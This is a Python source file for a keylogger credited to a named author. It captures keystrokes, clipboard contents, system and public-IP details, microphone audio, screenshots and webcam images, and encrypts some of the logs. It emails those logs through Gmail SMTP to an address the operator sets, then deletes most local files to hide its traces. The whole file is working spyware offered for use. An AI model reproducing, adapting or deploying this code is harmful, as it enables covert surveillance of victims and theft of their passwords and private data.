"""
Program: KeyLogger (with Microphone, WebCamera, Screenshots, Audio Logging Feature)
Author: Sajin Xavier
"""

# Libraries
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cv2 import VideoCapture, imshow, imwrite, destroyWindow, waitKey
import smtplib
import socket
import platform
import win32clipboard
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab

# Global Variables
key_log_file = "key_log.txt"
system_info_file = "system_info.txt"
clipboard_file = "clipboard.txt"
audio_file = "audio_recording.wav"
screenshot_file = "screenshot.png"
webcam_image_file = "webcam_image.png"

key_log_encrypted = "encrypted_key_log.txt"
system_info_encrypted = "encrypted_system_info.txt"
clipboard_encrypted = "encrypted_clipboard.txt"

mic_recording_time = 10
iteration_time_interval = 15
max_iterations = 3

email_address = "name@domain.com"  # Enter disposable email here
email_password = "passw0rd"  # Enter email password here
recipient_address = " "  # Enter the email address you want to send your information to
encryption_key = " "  # Generate an encryption key from the Cryptography folder
output_directory = " "  # Enter the file path you want your files to be saved to
file_separator = "\\"
file_save_path = output_directory + file_separator

# Send Email
def send_email(filename, attachment, recipient_address):
    sender_address = email_address
    msg = MIMEMultipart()
    msg['From'] = sender_address
    msg['To'] = recipient_address
    msg['Subject'] = "Log File"
    body = "Attached log file."
    msg.attach(MIMEText(body, 'plain'))
    
    with open(attachment, 'rb') as attachment_file:
        file_payload = MIMEBase('application', 'octet-stream')
        file_payload.set_payload(attachment_file.read())
        encoders.encode_base64(file_payload)
        file_payload.add_header('Content-Disposition', f"attachment; filename={filename}")
        msg.attach(file_payload)

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_address, email_password)
        server.sendmail(sender_address, recipient_address, msg.as_string())

send_email(key_log_file, file_save_path + key_log_file, recipient_address)

# Get System Information
def collect_system_info():
    with open(file_save_path + system_info_file, "a") as file:
        hostname = socket.gethostname()
        private_ip = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            file.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            file.write("Couldn't retrieve Public IP Address.\n")

        file.write("Processor: " + platform.processor() + '\n')
        file.write("System: " + platform.system() + " " + platform.version() + '\n')
        file.write("Machine: " + platform.machine() + '\n')
        file.write("Hostname: " + hostname + '\n')
        file.write("Private IP Address: " + private_ip + '\n')

collect_system_info()

# Copy Clipboard Data
def collect_clipboard_data():
    with open(file_save_path + clipboard_file, "a") as file:
        try:
            win32clipboard.OpenClipboard()
            clipboard_content = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write("Clipboard Data:\n" + clipboard_content + '\n')
        except Exception:
            file.write("Unable to access clipboard.\n")

collect_clipboard_data()

# Record Microphone Audio
def record_microphone():
    sampling_rate = 44100
    duration = mic_recording_time
    audio_recording = sd.rec(int(duration * sampling_rate), samplerate=sampling_rate, channels=2)
    sd.wait()
    write(file_save_path + audio_file, sampling_rate, audio_recording)

record_microphone()

# Capture Screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(file_save_path + screenshot_file)

capture_screenshot()

# Capture Webcam Image
def capture_webcam_image():
    webcam = VideoCapture(0)
    success, image = webcam.read()
    if success:
        imshow("Webcam", image)
        imwrite(file_save_path + webcam_image_file, image)
        waitKey(1)
        destroyWindow("Webcam")

capture_webcam_image()

# Keylogger Loop
iteration_count = 0
start_time = time.time()
end_time = start_time + iteration_time_interval

while iteration_count < max_iterations:
    keystrokes = []

    def on_key_press(key):
        global keystrokes
        keystrokes.append(key)
        write_keys_to_file(keystrokes)
        keystrokes = []

    def write_keys_to_file(keys):
        with open(file_save_path + key_log_file, "a") as file:
            for key in keys:
                key_str = str(key).replace("'", "")
                if "space" in key_str:
                    file.write("\n")
                elif "Key" not in key_str:
                    file.write(key_str)

    def on_key_release(key):
        if key == Key.esc or time.time() > end_time:
            return False

    with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

    iteration_count += 1
    end_time = time.time() + iteration_time_interval

# Encrypt Collected Data
files_to_encrypt = [file_save_path + system_info_file, file_save_path + clipboard_file, file_save_path + key_log_file]
encrypted_files = [file_save_path + system_info_encrypted, file_save_path + clipboard_encrypted, file_save_path + key_log_encrypted]

for i, file in enumerate(files_to_encrypt):
    with open(file, 'rb') as file_to_encrypt:
        file_data = file_to_encrypt.read()
    encrypted_data = Fernet(encryption_key).encrypt(file_data)
    with open(encrypted_files[i], 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

    send_email(encrypted_files[i], encrypted_files[i], recipient_address)

# Cleanup Collected Files
temp_files = [system_info_file, clipboard_file, key_log_file, screenshot_file, audio_file]
for temp_file in temp_files:
    os.remove(file_save_path + temp_file)
